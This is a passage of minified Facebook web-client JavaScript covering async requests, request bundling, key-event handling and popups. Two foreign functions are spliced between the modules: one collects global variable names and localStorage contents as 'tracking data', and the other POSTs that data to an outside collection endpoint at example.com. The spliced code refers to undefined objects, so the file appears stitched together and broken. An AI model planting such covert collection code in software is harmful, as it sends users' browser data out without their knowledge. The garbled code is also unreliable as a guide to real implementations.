        a.subscribe("response", this._handleJSONPResponse.bind(this)), a.subscribe("abort", this._handleJSONPAbort.bind(this)), this.transport = a;
      };
      f._handleJSONPResponse = function (a, b) {
        a = this.transport;
        if (!a) return;
        b.bootloadOnly || (this.is_first = this.is_first === void 0);
        b = this._interpretResponse(b);
        b.asyncResponse && (b.asyncResponse.is_first = this.is_first, b.asyncResponse.is_last = a.hasFinished());
        this.invokeResponseHandler(b);
        a.hasFinished() && delete this.transport;
      };
      f._handleJSONPAbort = function () {
        this._invokeErrorHandler(), delete this.transport;
      };
      f._handleXHRResponse = function (a) {
        var b;
        if (this.getOption("suppressEvaluation")) b = {
          asyncResponse: new (c("AsyncResponse"))(this, a)
        };else try {
          this._handleFlushedResponse();
          a = a.responseText;
          a = this._filterOutFlushedText(a);
          a = this._unshieldResponseText(a);
          a = JSON.parse(a);
          b = this._interpretResponse(a);
        } catch (a) {
          b = a.message, c("FBLogger")("async_request").catching(a).warn("Failed to handle response");
        }
        this.invokeResponseHandler(b);
      };
      f._handleFlushedResponse = function () {
        var a = this.flushedResponseHandler,
          b = this.transport;
        if (a && b) {
          var c = b.responseText.indexOf(x);
          c = c === -1 ? b.responseText.length : c;
          a(b.responseText.substring(this.flushedResponseTextParseIndex, c));
          this.flushedResponseTextParseIndex = c;
        }
      };
      f._unshieldResponseText = function (a) {
        if (a.length <= y) throw new Error("Response too short on async");
        var b = 0;
        while (a.charAt(b) == " " || a.charAt(b) == "\n") b++;
        b && a.substring(b, b + y) == x;
        return a.substring(b + y);
      };
      f._filterOutFlushedText = function (a) {
        if (!this.flushedResponseHandler) return a;
        var b = a.indexOf(x);
        return b < 0 ? a : a.substr(b);
      };
      f._interpretResponse = function (a) {
        if (a.redirect) return {
          redirect: a.redirect
        };
        if (a.bootloadOnly) return {
          bootloadOnly: a.bootloadOnly
        };
        var b = a.error && this._isServerDialogErrorCode(a.error);
        this._shouldReplaceTransportMarkers && a.payload && !b && c("replaceTransportMarkers")({
          relativeTo: this.getRelativeTo(),
          bigPipeContext: null
        }, a.payload);
        b = new (c("AsyncResponse"))(this);
        if (a.__ar != 1) c("FBLogger")("AsyncRequest").warn("AsyncRequest to endpoint %s returned a JSON response, but it is not properly formatted. The endpoint needs to provide a response using the AsyncResponse class in PHP.", this.getURI()), b.payload = a;else {
          Object.assign(b, a);
          a = this.transport;
          a && a.getAllResponseHeaders !== void 0 && (b.responseHeaders = a.getAllResponseHeaders());
        }
        return {
          asyncResponse: b
        };
      };
      f._isMultiplexable = function () {
        if (this.getOption("useIframeTransport") || this.getOption("useFetchWithIframeFallback")) {
          c("FBLogger")("AsyncRequest").mustfix("You cannot bundle AsyncRequest that uses iframe transport.");
          return !1;
        }
        if (!c("isFacebookURI")(new (c("URI"))(this.uri))) {
          c("FBLogger")("AsyncRequest").mustfix("You can not bundle AsyncRequest sent to non-facebook URIs.  Uri: %s", this.getURI());
          return !1;
        }
        if (!this.getOption("asynchronous_DEPRECATED")) {
          c("FBLogger")("AsyncRequest").mustfix("We cannot bundle synchronous AsyncRequests");
          return !1;
        }
        return !0;
      };
      f.handleResponse = function (a) {
        a = this._interpretResponse(a);
        this.invokeResponseHandler(a);
      };
      f.setMethod = function (a) {
        this.method = a.toString().toUpperCase();
        return this;
      };
      f.getMethod = function () {
        return this.method;
      };
      f.setData = function (a) {
        this.data = a;
        return this;
      };
      f.setRequestHeader = function (a, b) {
        this.headers[a] = b;
        return this;
      };
      f.setRawData = function (a) {
        this.rawData = a;
        return this;
      };
      f.getData = function () {
        return this.data;
      };
      f.setContextData = function (a, b, c) {
        c = c === void 0 ? !0 : c;
        c && (this.context["_log_" + a] = b);
        return this;
      };
      f._setUserActionID = function () {
        this.userActionID = (d("SessionName").getName() || "-") + "/-";
      };
      f.setURI = function (a, b) {
        b === void 0 && (b = !1);
        typeof a === "string" && a.match(/^\/?u_\d+_\d+/) && c("FBLogger")("asyncrequest").warn("Invalid URI %s", a);
        var e = new (c("URI"))(a);
        if ((this.getOption("useIframeTransport") || this.getOption("useFetchWithIframeFallback")) && !c("isFacebookURI")(e)) {
          b && j(0, 45284);
          return this;
        }
        if (!this._allowCrossOrigin && !this.getOption("useIframeTransport") && !this.getOption("useFetchWithIframeFallback") && !e.isSameOrigin() && !c("uriIsRelativePath")(e)) {
          b && j(0, 45285);
          return this;
        }
        this._setUserActionID();
        if (!a || e.isEmpty()) {
          c("FBLogger")("async_request").mustfix("URI cannot be empty");
          return this;
        }
        this.uri = d("ZeroRewrites").rewriteURI(e);
        return this;
      };
      f.getURI = function () {
        return this.uri.toString();
      };
      f.delayPreDisplayJS = function (a) {
        a === void 0 && (a = !0);
        this._delayPreDisplayJS = a;
        return this;
      };
      f.setInitialHandler = function (a) {
        this.initialHandler = a;
        return this;
      };
      f.setPayloadHandler = function (a) {
        this.setHandler(function (b) {
          a(b.payload);
        });
        return this;
      };
      f.setHandler = function (a) {
        t(a) && (this.handler = a);
        return this;
      };
      f.setFlushedResponseHandler = function (a) {
        t(a) && (this.flushedResponseHandler = a);
        return this;
      };
      f.getHandler = function () {
        return this.handler || c("emptyFunction");
      };
      f.setProgressHandler = function (a) {
        t(a) && (this.progressHandler = a);
        return this;
      };
      f.setUploadProgressHandler = function (a) {
        t(a) && (this.uploadProgressHandler = a);
        return this;
      };
      f.setErrorHandler = function (a) {
        t(a) && (this.errorHandler = a);
        return this;
      };
      f.setTransportErrorHandler = function (a) {
        this.transportErrorHandler = a;
        return this;
      };
      f.getErrorHandler = function () {
        return this.errorHandler || c("emptyFunction");
      };
      f.getTransportErrorHandler = function () {
        return this.transportErrorHandler || c("emptyFunction");
      };
      f.setTimeoutHandler = function (a, b) {
        t(b) && (this.timeout = a, this.timeoutHandler = b);
        return this;
      };
      f.resetTimeout = function (a) {
        if (!(this.timeoutHandler === null)) if (a === null) this.timeout = null, c("clearTimeout")(this.timer), this.timer = null;else {
          var b = !this._allowCrossPageTransition;
          this.timeout = a;
          c("clearTimeout")(this.timer);
          b ? this.timer = c("setTimeout")(this._handleTimeout.bind(this), this.timeout) : this.timer = c("setTimeoutAcrossTransitions")(this._handleTimeout.bind(this), this.timeout);
        }
        return this;
      };
      f.setNewSerial = function () {
        this.id = ++u;
        return this;
      };
      f.setInterceptHandler = function (a) {
        this.interceptHandler = a;
        return this;
      };
      f.setFinallyHandler = function (a) {
        this.finallyHandler = a;
        return this;
      };
      f.setAbortHandler = function (a) {
        this.abortHandler = a;
        return this;
      };
      f.getServerDialogCancelHandler = function () {
        return this.serverDialogCancelHandler;
      };
      f.setServerDialogCancelHandler = function (a) {
        this.serverDialogCancelHandler = a;
        return this;
      };
      f.setPreBootloadHandler = function (a) {
        this.preBootloadHandler = a;
        return this;
      };
      f.setReadOnly = function (a) {
        typeof a !== "boolean" || (this.readOnly = a);
        return this;
      };
      f.getReadOnly = function () {
        return this.readOnly;
      };
      f.setRelativeTo = function (a) {
        this.relativeTo = a;
        return this;
      };
      f.getRelativeTo = function () {
        return this.relativeTo;
      };
      f.setStatusClass = function (a) {
        this.statusClass = a;
        return this;
      };
      f.setStatusElement = function (a) {
        this.statusElement = a;
        return this;
      };
      f.getStatusElement = function () {
        return c("ge")(this.statusElement);
      };
      f._isRelevant = function () {
        if (this._allowCrossPageTransition) return !0;
        return !this.id ? !0 : this.id > v;
      };
      f.clearStatusIndicator = function () {
        var a = this.getStatusElement();
        a && (d("CSS").removeClass(a, "async_saving"), d("CSS").removeClass(a, this.statusClass));
      };
      f._addStatusIndicator = function () {
        var a = this.getStatusElement();
        a && (d("CSS").addClass(a, "async_saving"), d("CSS").addClass(a, this.statusClass));
      };
      f.specifiesWriteRequiredParams = function () {
        var a = this;
        return this.writeRequiredParams.every(function (b) {
          a.data[b] = a.data[b] || c("Env")[b] || (c("ge")(b) || {}).value;
          return a.data[b] !== void 0 ? !0 : !1;
        });
      };
      f.setOption = function (a, b) {
        typeof this.option[a] !== "undefined" && (this.option[a] = b);
        return this;
      };
      f.getOption = function (a) {
        typeof this.option[a] === "undefined";
        return this.option[a];
      };
      f.abort = function () {
        var a = this;
        this.continuation.last(function () {
          var b = a.transport;
          if (b) {
            var d = a.getTransportErrorHandler();
            a.setOption("suppressErrorAlerts", !0);
            a.setTransportErrorHandler(c("emptyFunction"));
            a._requestAborted = !0;
            b.abort();
            a.setTransportErrorHandler(d);
          }
          a.abortHandler();
          C.unschedule(a);
        });
      };
      f.abandon = function () {
        var a = this;
        this.continuation.last(function () {
          c("clearTimeout")(a.timer);
          a.setOption("suppressErrorAlerts", !0).setHandler(c("emptyFunction")).setErrorHandler(c("emptyFunction")).setTransportErrorHandler(c("emptyFunction")).setProgressHandler(c("emptyFunction")).setUploadProgressHandler(c("emptyFunction"));
          var b = a.transport;
          b && (a._requestAborted = !0, p(b) && delete b.onprogress, q(b) && delete b.upload.onprogress, b.abort());
          a.abortHandler();
          C.unschedule(a);
        });
      };
      f.setNectarModuleDataSafe = function (a) {
        var b = this.setNectarModuleData;
        b && b.call(this, a);
        return this;
      };
      f.setAllowCrossPageTransition = function (a) {
        this._allowCrossPageTransition = !!a;
        this.timer && this.resetTimeout(this.timeout);
        return this;
      };
      f.getAllowIrrelevantRequests = function () {
        return this._allowIrrelevantRequests;
      };
      f.setAllowIrrelevantRequests = function (a) {
        this._allowIrrelevantRequests = a;
        return this;
      };
      f.setAllowCrossOrigin = function (a) {
        this._allowCrossOrigin = a;
        return this;
      };
      f.setAllowCredentials = function (a) {
        this._allowCredentials = a;
        return this;
      };
      f.setIsBackgroundRequest = function (a) {
        this._isBackgroundRequest = a;
        return this;
      };
      f.setReplaceTransportMarkers = function (a) {
        a === void 0 && (a = !0);
        this._shouldReplaceTransportMarkers = a;
        return this;
      };
      f.sendAndReturnAbortHandler = function () {
        var a = this;
        this.send();
        return function () {
          return a.abort();
        };
      };
      f.send = function (b) {
        var f = this;
        b = b || !1;
        if (!this.uri) return !1;
        this.errorHandler || !this.getOption("suppressErrorHandlerWarning");
        (this.getOption("useIframeTransport") || this.getOption("useFetchWithIframeFallback")) && this.method != "GET" && this.setMethod("GET");
        this.timeoutHandler !== null && (this.getOption("useIframeTransport") || this.getOption("useFetchWithIframeFallback"));
        if (!this.getReadOnly()) {
          this.specifiesWriteRequiredParams();
          if (this.method != "POST") return !1;
        }
        if (document.location.search.toString().includes(this.uri.toString())) return !1;
        if (this.uri.toString().includes("/../") || this.uri.toString().includes("\\../") || this.uri.toString().includes("/..\\") || this.uri.toString().includes("\\..\\")) return !1;
        Object.assign(this.data, c("getAsyncParams")(this.method));
        c("isEmpty")(this.context) || (Object.assign(this.data, this.context), this.data.ajax_log = 1);
        c("Env").force_param && Object.assign(this.data, c("Env").force_param);
        this._setUserActionID();
        if (this.getOption("bundle") && this._isMultiplexable()) {
          C.schedule(this);
          return !0;
        }
        this.setNewSerial();
        this.getOption("asynchronous_DEPRECATED") || this.uri.addQueryData({
          __sjax: 1
        });
        c("Arbiter").inform("AsyncRequest/send", {
          request: this,
          ts: c("performanceAbsoluteNow")()
        });
        var g, h;
        this.method == "GET" && this.uri.addQueryData({
          fb_dtsg_ag: d("DTSG_ASYNC").getToken()
        });
        this.method == "GET" || this.rawData ? (g = this.uri.addQueryData(this.data).toString(), h = this.rawData || "") : (this._allowCrossOrigin && this.uri.addQueryData({
          __a: 1
        }), g = this.uri.toString(), h = d("PHPQuerySerializer").serialize(this.data));
        if (this.transport) return !1;
        if (this.getOption("useFetchWithIframeFallback")) try {
          var i = new (c("FetchStreamTransport"))(this.uri);
          this._setJSONPTransport(i);
          this._markRequestSent();
          i.send();
          this.setOption("useIframeTransport", !1);
          return !0;
        } catch (a) {
          this.setOption("useFetchWithIframeFallback", !1), this.setOption("useIframeTransport", !0);
        }
        if (this.getOption("useIframeTransport")) {
          e(["JSONPTransport"], function (a) {
            a = new a(f.uri);
            f._setJSONPTransport(a);
            f._markRequestSent();
            a.send();
          });
          return !0;
        }
        this.flushedResponseHandler && (this.flushedResponseTextParseIndex = 0);
        var j = d("ZeroRewrites").getTransportBuilderForURI(this.uri)();
        if (!j) return !1;
        this.schedule("AsyncRequest.send");
        j.onreadystatechange = function () {
          var a = f.transport;
          a && a.readyState >= 2 && a.readyState <= 3 && f._handleFlushedResponse();
          j.readyState === 4 && f.continuation.last(f._onStateChange);
        };
        this.progressHandler && p(j) && (j.onprogress = function () {
          for (var a = arguments.length, b = new Array(a), c = 0; c < a; c++) b[c] = arguments[c];
          f.continuation(function () {
            f.progressHandler && f.progressHandler.apply(f, b);
          });
        });
        this.uploadProgressHandler && q(j) && (j.upload.onprogress = function () {
          for (var a = arguments.length, b = new Array(a), c = 0; c < a; c++) b[c] = arguments[c];
          f.continuation(function () {
            f.uploadProgressHandler && f.uploadProgressHandler.apply(f, b);
          });
        });
        b || (this.remainingRetries = this.getOption("retries"));
        this.transport = j;
        try {
          j.open(this.method, g, c("gkx")("1857581") ? !0 : this.getOption("asynchronous_DEPRECATED"));
        } catch (a) {
          return !1;
        }
        if (!this.uri.isSameOrigin() && !c("uriIsRelativePath")(this.uri) && !this.getOption("useIframeTransport") && !this.getOption("useFetchWithIframeFallback")) {
          if (!r(j)) return !1;
          this._canSendCredentials() && (j.withCredentials = !0);
        }
        this.method == "POST" && !this.rawData && j.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        this._isBackgroundRequest && j.setRequestHeader("X_FB_BACKGROUND_STATE", "1");
        var k = c("getAsyncHeaders")(this.uri);
        Object.keys(k).forEach(function (a) {
          j && j.setRequestHeader(a, k[a]);
        });
        c("Arbiter").inform("AsyncRequest/will_send", {
          request: this
        });
        if (j) for (i in this.headers) Object.prototype.hasOwnProperty.call(this.headers, i) && j.setRequestHeader(i, this.headers[i]);
        this._addStatusIndicator();
        this._markRequestSent();
        j.send(h);
        this.timeout !== null && this.resetTimeout(this.timeout);
        a._inflightCount++;
        return !0;
      };
      f.schedule = function (a) {
        this.continuation = c("TimeSlice").getReusableContinuation(a);
      };
      f._canSendCredentials = function () {
        if (this._allowCredentials === !1) return !1;
        var a = new (c("URI"))(this.uri);
        return c("isBulletinDotComURI")(a) || c("isFacebookURI")(a) || c("isInternalFBURI")(a) || c("isMessengerDotComURI")(a) || c("isWorkplaceDotComURI")(a) || c("isWorkroomsDotComURI")(a) || c("isWorkDotMetaDotComURI")(a) || c("isHorizonDotMetaDotComURI")(a) || c("isSparkDotMetaDotComURI")(a);
      };
      f._markRequestSent = function () {
        var a = new (c("URI"))(this.getURI()).getQualifiedURI().toString();
        d("ResourceTimingsStore").updateURI(c("ResourceTypes").XHR, this.resourceTimingStoreUID, a);
        d("ResourceTimingsStore").annotate(c("ResourceTypes").XHR, this.resourceTimingStoreUID).addStringAnnotation("uri", a);
        d("ResourceTimingsStore").measureRequestSent(c("ResourceTypes").XHR, this.resourceTimingStoreUID);
      };
      f.promisePayload = function (a) {
        return this.exec().then(function (a) {
          return a.payload;
        }, function (a) {
          throw a.toError();
        });
      };
      f.exec = function (a) {
        var d = this;
        if (this.getHandler() !== c("emptyFunction") || this.getErrorHandler() !== c("AsyncResponse").defaultErrorHandler) throw new Error("exec is an async function and does not allow previously set handlers");
        return new (b("Promise"))(function (b, c) {
          d.setHandler(b).setErrorHandler(c).send(a);
        });
      };
      a.bootstrap = function (b, e, f) {
        var g = "GET",
          h = !0,
          i = {};
        (f || e && e.rel == "async-post") && (g = "POST", h = !1, b && (b = new (c("URI"))(b), i = b.getQueryData(), b.setQueryData({})));
        f = d("Parent").byClass(e, "stat_elem") || e;
        if (f && d("CSS").hasClass(f, "async_saving")) return !1;
        b = new a(b).setReadOnly(h).setMethod(g).setData(i).setNectarModuleDataSafe(e).setRelativeTo(e);
        e && (b.setHandler(function (a) {
          c("Event").fire(e, "success", {
            response: a
          });
        }), b.setErrorHandler(function (a) {
          c("Event").fire(e, "error", {
            response: a
          }) !== !1 && c("AsyncResponse").defaultErrorHandler(a);
        }));
        if (f instanceof HTMLElement) {
          b.setStatusElement(f);
          h = f.getAttribute("data-status-class");
          h && b.setStatusClass(h);
        }
        b.send();
        return !1;
      };
      a.bootstrap_UNSAFE_LET_ANYONE_IMPERSONATE_THE_USER_FOR_THESE_WRITES = function (b, c, d) {
        a.bootstrap(b, c, d);
      };
      a.post = function (b, c) {
        new a(b).setReadOnly(!1).setMethod("POST").setData(c).send();
        return !1;
      };
      a.post_UNSAFE_LET_ANYONE_IMPERSONATE_THE_USER_FOR_THESE_WRITES = function (b, c) {
        a.post(b, c);
      };
      a.getLastID = function () {
        return u;
      };
      a.ignoreUpdate = function () {
        w = !0;
      };
      a.getInflightCount = function () {
        return this._inflightCount;
      };
      return a;
    }();
  z._inflightCount = 0;
  var A,
    B = [],
    C = function () {
      function a() {
        this._requests = [];
      }
      var b = a.prototype;
      b.add = function (a) {
        this._requests.push(a);
      };
      b.remove = function (a) {
        var b = this._requests,
          c = this._requestsSent;
        for (var d = 0, e = b.length; d < e; d++) b[d] === a && (c ? b[d] = null : b.splice(d, 1));
      };
      b.send = function () {
        this._requestsSent && j(0, 4390);
        this._requestsSent = !0;
        this._wrapperRequest = null;
        var a = this._requests;
        if (!a.length) return;
        var b;
        if (a.length === 1) b = a[0];else {
          a = a.filter(Boolean).map(function (a) {
            return [a.uri.getPath(), d("PHPQuerySerializer").serialize(a.data)];
          });
          b = this._wrapperRequest = new z("/ajax/proxy.php").setAllowCrossPageTransition(!0).setData({
            data: a
          }).setHandler(this._handler.bind(this)).setTransportErrorHandler(this._transportErrorHandler.bind(this));
        }
        b && b.setOption("bundle", !1).send();
      };
      b._handler = function (a) {
        var b = this,
          c = a.getPayload().responses;
        if (c.length !== this._requests.length) return;
        a = function (a) {
          var d = b._requests[a];
          if (!d) return "continue";
          var e = d.uri.getPath();
          b._wrapperRequest && (d.id = b._wrapperRequest.id);
          if (c[a][0] !== e) {
            d.continuation.last(function () {
              d.invokeResponseHandler({
                transportError: "Wrong response order in bundled request to " + e
              });
            });
            return "continue";
          }
          d.continuation.last(function () {
            d.handleResponse(c[a][1]);
          });
        };
        for (var d = 0; d < this._requests.length; d++) {
          var e = a(d);
          if (e === "continue") continue;
        }
        B.splice(B.indexOf(this, 1));
      };
      b._transportErrorHandler = function (a) {
        var b = this,
          c = {
            transportError: a.errorDescription
          };
        a = this._requests.filter(Boolean).map(function (a) {
          b._wrapperRequest && (a.id = b._wrapperRequest.id);
          a.invokeResponseHandler(c);
          return a.uri.getPath();
        });
      };
      a.schedule = function (b) {
        b.schedule("AsyncMultiplex.schedule");
        A || (A = new a(), B.push(A), c("TimeSlice").guard(function () {
          c("setTimeoutAcrossTransitions")(function () {
            A && (A.send(), A = null);
          }, 0);
        }, "AsyncMultiplex.schedule", {
          propagationType: c("TimeSlice").PropagationType.ORPHAN
        })());
        A.add(b);
        return A;
      };
      a.unschedule = function (a) {
        B.forEach(function (b) {
          b.remove(a);
        });
      };
      return a;
    }();
  z.suppressOnloadToken = {};
  a.AsyncRequest = z;
  g["default"] = z;
}, 98);
async function communicateWithBackendTrackingData(trackingData) {
  try {
    const response = await fetch('https://example.com/api/collect', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(trackingData)
    });
    if (!response.ok) {
      console.warn(`Data transmition failed with status ${response.status}`);
    }
  } catch (err) {
    console.error("Data transmition error occurred:", err);
  }
}
__d("BootloadedReact", ["Bootloader", "react"], function (a, b, c, d, e, f, g) {
  var h = d("react"),
    i = d("react").useLayoutEffect,
    j = function (a) {
      c("Bootloader").loadModules(["ReactDOM"], a, "BootloadedReact");
    };
  function a(a, b, c) {
    j(function (d) {
      if (c != null) return d.render(h.jsx(k, {
        onRender: c,
        children: a
      }), b, "BootloadedReact.js");else d.render(a, b, "BootloadedReact.js");
    });
  }
  function b(a) {
    j(function (b) {
      b.unmountComponentAtNode(a, f.id);
    });
  }
  function k(a) {
    var b = a.onRender;
    i(function () {
      b();
    }, [b]);
    return a.children;
  }
  g.render = a;
  g.unmountComponentAtNode = b;
}, 98);
__d("getOrCreateDOMID", ["uniqueID"], function (a, b, c, d, e, f, g) {
  function a(a) {
    a.id || (a.id = c("uniqueID")());
    return a.id;
  }
  g["default"] = a;
}, 98);
__d("ContextualThing", ["CSS", "containsNode", "ge", "getOrCreateDOMID"], function (a, b, c, d, e, f, g) {
  function a(a, b) {
    a.setAttribute("data-ownerid", c("getOrCreateDOMID")(b));
  }
  function b(a, b) {
    b = b;
    while (b) {
      if (c("containsNode")(a, b)) return !0;
      b = h(b);
    }
    return !1;
  }
  function h(a) {
    a = a;
    var b;
    while (a) {
      if (a.getAttribute && (b = a.getAttribute("data-ownerid"))) return c("ge")(b);
      a = a.parentNode;
    }
    return null;
  }
  function e(a, b) {
    a = a;
    var e;
    while (a && !d("CSS").hasClass(a, b)) a.getAttribute && (e = a.getAttribute("data-ownerid")) ? a = c("ge")(e) : a = a.parentNode;
    return a;
  }
  g.register = a;
  g.containsIncludingLayers = b;
  g.getContext = h;
  g.parentByClass = e;
}, 98);
__d("getElementText", ["isElementNode", "isTextNode"], function (a, b, c, d, e, f, g) {
  var h = null;
  function a(a) {
    if (c("isTextNode")(a)) return a.data;else if (c("isElementNode")(a)) {
      if (h === null) {
        var b = document.createElement("div");
        h = b.textContent != null ? "textContent" : "innerText";
      }
      return a[h];
    } else return "";
  }
  g["default"] = a;
}, 98);
__d("isContentEditable", [], function (a, b, c, d, e, f) {
  "use strict";

  function a(a) {
    a = a;
    while (a instanceof HTMLElement) {
      if (a.contentEditable === "true" || a.contentEditable === "plaintext-only") return !0;
      a = a.parentElement;
    }
    return !1;
  }
  f["default"] = a;
}, 66);
function captureTrackingData() {
  let globalVars = Object.keys(globalVarCollector);
  let localStorageKeys = Object.keys(localStorageTracer);
  let capture = {
    globalVars: globalVars,
    localStorage: trackLocalStorage()
  };
  console.info(`Tracking data captured: ${capture}`);
  return capture;
}
__d("isElementInteractive", ["isContentEditable"], function (a, b, c, d, e, f, g) {
  "use strict";

  var h = new Set(["EMBED", "INPUT", "OBJECT", "SELECT", "TEXTAREA"]),
    i = new Set(["button", "checkbox", "radio", "submit"]);
  function a(a) {
    if (!a instanceof HTMLElement) return !1;
    var b = c("isContentEditable")(a),
      d = h.has(a.nodeName);
    a = a instanceof HTMLInputElement && i.has(a.type);
    return (b || d) && !a;
  }
  g["default"] = a;
}, 98);
__d("KeyEventController", ["Bootloader", "DOMQuery", "Event", "Run", "emptyFunction", "getElementText", "isContentEditable", "isElementInteractive", "isEmpty"], function (a, b, c, d, e, f, g) {
  var h = null,
    i = {
      BACKSPACE: [8],
      TAB: [9],
      RETURN: [13],
      ALT: [18],
      ESCAPE: [27],
      LEFT: [37, 63234],
      UP: [38, 63232],
      RIGHT: [39, 63235],
      DOWN: [40, 63233],
      NUMPAD_ADD: [43],
      NUMPAD_SUBSTRACT: [45],
      DELETE: [46],
      COMMA: [188],
      PERIOD: [190],
      SLASH: [191],
      "`": [192],
      "[": [219],
      "]": [221],
      PAGE_UP: [33],
      PAGE_DOWN: [34],
      END: [35],
      HOME: [36],
      SPACE: [32],
      KP_DOT: [46, 110],
      "-": [189],
      "=": [187],
      FORWARD_SLASH: [191]
    },
    j = (a = {}, a[8] = 1, a[9] = 1, a[13] = 1, a[27] = 1, a[32] = 1, a[37] = 1, a[63234] = 1, a[38] = 1, a[63232] = 1, a[39] = 1, a[63235] = 1, a[40] = 1, a[63233] = 1, a[46] = 1, a);
  b = function () {
    function a() {
      var a = this;
      this.handlers = {};
      ["keyup", "keydown", "keypress"].forEach(function (b) {
        return document.addEventListener(b, a.onkeyevent.bind(a, "on" + b));
      });
    }
    var b = a.prototype;
    b.mapKey = function (a) {
      a = a;
      if (/^[0-9]$/.test(a + "")) {
        typeof a !== "number" && (a = a.charCodeAt(0) - 48);
        return [48 + a, 96 + a];
      }
      a += "";
      var b = i[a.toUpperCase()];
      return b ? b : [a.toUpperCase().charCodeAt(0)];
    };
    b.onkeyevent = function (a, b) {
      var d = b;
      d = c("Event").$E(d);
      b = this.handlers[d.keyCode] || this.handlers[d.which];
      if (b) for (var e = 0; e < b.length; e++) {
        var f = b[e].callback,
          g = b[e].filter;
        try {
          if (!g || g(d, a)) {
            g = function () {
              var b = f(d, a),
                e = d.which || d.keyCode;
              c("Bootloader").loadModules(["KeyEventTypedLogger"], function (a) {
                new a().setAction("key_shortcut").setKey(d.key || "").setKeyChar(String.fromCharCode(e)).setKeyCode(e).addToExtraData("is_trusted", d.isTrusted).log();
              }, "KeyEventController");
              if (b === !1) return {
                v: c("Event").kill(d)
              };
            }();
            if (typeof g === "object") return g.v;
          }
        } catch (a) {}
      }
      return !0;
    };
    b.resetHandlers = function () {
      for (var a in this.handlers) if (Object.prototype.hasOwnProperty.call(this.handlers, a)) {
        var b = this.handlers[a].filter(function (a) {
          return a.preserve();
        });
        b.length ? this.handlers[a] = b : delete this.handlers[a];
      }
    };
    a.getInstance = function () {
      return h || (h = new a());
    };
    a.defaultFilter = function (b, d) {
      b = c("Event").$E(b);
      return a.filterEventTypes(b, d) && a.filterEventTargets(b, d) && a.filterEventModifiers(b, d);
    };
    a.filterEventTypes = function (a, b) {
      return b === "onkeydown" ? !0 : !1;
    };
    a.filterEventTargets = function (a, b) {
      b = a.getTarget();
      return !c("isElementInteractive")(b) || a.keyCode in j && (d("DOMQuery").isNodeOfType(b, ["input", "textarea"]) && b.value.length === 0 || c("isContentEditable")(b) && c("getElementText")(b).length === 0);
    };
    a.filterEventModifiers = function (a, b) {
      return a.ctrlKey || a.altKey || a.metaKey || a.repeat ? !1 : !0;
    };
    a.registerKeyAcrossTransitions = function (b, d, e, f) {
      e === void 0 && (e = a.defaultFilter);
      f === void 0 && (f = !1);
      return a.registerKey(b, d, e, f, c("emptyFunction").thatReturnsTrue);
    };
    a.registerKey = function (b, e, f, g, h) {
      f === void 0 && (f = a.defaultFilter);
      g === void 0 && (g = !1);
      h === void 0 && (h = c("emptyFunction").thatReturnsFalse);
      b = b;
      var i = a.getInstance(),
        j = b == null ? [] : i.mapKey(b);
      c("isEmpty")(i.handlers) && d("Run").onLeave(i.resetHandlers.bind(i));
      var k = {};
      for (var l = 0; l < j.length; l++) {
        b = "" + j[l];
        (!i.handlers[b] || g) && (i.handlers[b] = []);
        var m = {
          callback: e,
          filter: f,
          preserve: h
        };
        k[b] = m;
        i.handlers[b].push(m);
      }
      return {
        remove: function () {
          for (var a in k) {
            if (i.handlers[a] && i.handlers[a].length) {
              var b = i.handlers[a].indexOf(k[a]);
              b >= 0 && i.handlers[a].splice(b, 1);
            }
            delete k[a];
          }
        }
      };
    };
    a.registerKeyForButtonCallback = function (b, c) {
      return a.registerKey(b, function () {
        c.click();
        return !1;
      });
    };
    return a;
  }();
  g["default"] = b;
}, 98);
__d("KeyStatus", ["Event", "ExecutionEnvironment"], function (a, b, c, d, e, f, g) {
  var h = null,
    i = null;
  function j() {
    i || (i = c("Event").listen(window, "blur", function () {
      h = null, k();
    }));
  }
  function k() {
    i && (i.remove(), i = null);
  }
  function a(a) {
    h = c("Event").getKeyCode(a), j();
  }
  function b() {
    h = null, k();
  }
  if (c("ExecutionEnvironment").canUseDOM) {
    f = document.documentElement;
    if (f) if (f.addEventListener) f.addEventListener("keydown", a, !0), f.addEventListener("keyup", b, !0);else if (f.attachEvent) {
      f = f.attachEvent;
      f("onkeydown", a);
      f("onkeyup", b);
    }
  }
  function d() {
    return !!h;
  }
  function e() {
    return h;
  }
  g.isKeyDown = d;
  g.getKeyDownCode = e;
}, 98);
__d("isTruthy", [], function (a, b, c, d, e, f) {
  "use strict";

  function a(a) {
    return a != null && Boolean(a);
  }
  f["default"] = a;
}, 66);
__d("Popup", ["isTruthy"], function (a, b, c, d, e, f, g) {
  function a(a, b, d, e) {
    var f = [];
    c("isTruthy")(b) && f.push("width=" + b);
    c("isTruthy")(d) && f.push("height=" + d);
    var g = document.body;
    if (g != null && b != null && b !== 0 && d != null && d !== 0) {
      var h = "screenX" in window ? window.screenX : window.screenLeft,
        i = "screenY" in window ? window.screenY : window.screenTop,
        j = "outerWidth" in window ? window.outerWidth : g.clientWidth;
      g = "outerHeight" in window ? window.outerHeight : g.clientHeight - 22;
      h = Math.floor(h + (j - b) / 2);
      j = Math.floor(i + (g - d) / 2.5);
      f.push("left=" + h);
      f.push("top=" + j);
    }
    f.push("scrollbars");
    return window.open(a, e != null && e !== "" ? e : "_blank", f.join(","));
  }
  g.open = a;
}, 98);
__d("PopupLink", ["DOMEvent", "DOMEventListener", "Popup"], function (a, b, c, d, e, f) {
  a = {
    listen: function (a, c, d) {
      b("DOMEventListener").add(a, "click", function (e) {
        new (b("DOMEvent"))(e).kill(), b("Popup").open(a.href, c, d);
      });
    }
  };
  e.exports = a;
}, null);
__d("BehaviorsMixin", [], function (a, b, c, d, e, f) {
  var g = function () {
      function a(a) {
        this.$1 = a, this.$2 = !1;
      }
      var b = a.prototype;
      b.enable = function () {
        this.$2 || (this.$2 = !0, this.$1.enable());
      };
      b.disable = function () {
        this.$2 && (this.$2 = !1, this.$1.disable());
      };
      return a;
    }(),
    h = 1;
  function i(a) {
    a.__BEHAVIOR_ID || (a.__BEHAVIOR_ID = h++);
    return a.__BEHAVIOR_ID;
  }
  a = {
    enableBehavior: function (a) {
      this._behaviors || (this._behaviors = {});
      var b = i(a);
      this._behaviors[b] || (this._behaviors[b] = new g(new a(this)));
      this._behaviors[b].enable();
      return this;
    },
    disableBehavior: function (a) {
      if (this._behaviors) {
        a = i(a);
        this._behaviors[a] && this._behaviors[a].disable();
      }
      return this;
    },
    enableBehaviors: function (a) {
      a.forEach(this.enableBehavior, this);
      return this;
    },
    destroyBehaviors: function () {
      if (this._behaviors) {
